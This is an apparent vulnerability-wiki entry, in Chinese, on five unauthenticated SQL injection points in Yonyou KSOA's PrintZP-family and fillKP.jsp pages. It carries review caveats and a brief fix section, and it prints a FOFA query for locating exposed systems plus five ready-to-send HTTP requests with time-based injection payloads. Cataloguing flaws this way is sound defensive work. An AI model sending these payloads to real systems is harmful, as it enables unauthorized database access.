---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友时空KSOA PrintZP族与fillKP五处SQL 注入"
product: "用友时空KSOA"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未具体"
prerequisites: "声明未认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA%E4%BA%94%E5%A4%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"用友-时空KSOA\""
category_recommendation: "ERP / 用友 KSOA"
id: "vw-cbbe48818f70b00989be4098"
entity_id: "ve-cbbe48818f70b00989be4098"
schema_version: "1"
---

# 用友时空KSOA PrintZP族与fillKP五处SQL 注入

## 条目说明

- 对象与具体问题：用友时空KSOA；PrintZP族与fillKP五处SQLi
- 版本、配置及部署条件：未具体
- 认证与权限前提：声明未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 执行两次表述可能SQL调用重复非两次验证，需解释为何总延时倍增
- 全为延时且无正常基线，影响/在野/修复缺证；HTTP未围栏

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

用友时空KSOA系统 PrintZP.jsp、PrintZPFB.jsp、PrintZPYG.jsp、PrintZPZP.jsp、fillKP.jsp等多处接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

影响版本

用友-时空KSOA

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="用友-时空KSOA"

POC/EXP：延时5秒，执行2次

```http
GET /kp/PrintZP.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```


![image-20240731130235861](./.resource/用友时空五处SQL注入漏洞/media/image-20240731130235861.png)


POC/EXP：延时3秒，执行2次

```http
GET /kp/PrintZPFB.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```


![image-20240731130320299](./.resource/用友时空五处SQL注入漏洞/media/image-20240731130320299.png)


POC/EXP：

```http
GET /kp/PrintZPYG.jsp?zpjhid=1%27%3BWAITFOR+DELAY+%270%3A0%3A10%27-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```


![image-20240731130411687](./.resource/用友时空五处SQL注入漏洞/media/image-20240731130411687.png)


POC/EXP：

```http
GET /kp/PrintZPZP.jsp?zpshqid=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```


![image-20240731130451864](./.resource/用友时空五处SQL注入漏洞/media/image-20240731130451864.png)


POC/EXP：延时5秒，执行两次 

```http
GET /kp/fillKP.jsp?kp_djbh=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```


![image-20240731130534897](./.resource/用友时空五处SQL注入漏洞/media/image-20240731130534897.png)


## 修复方案

1. 限制访问来源地址，如非必要，不要将系统开放在互联网上。

   升级至安全版本或打补丁。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
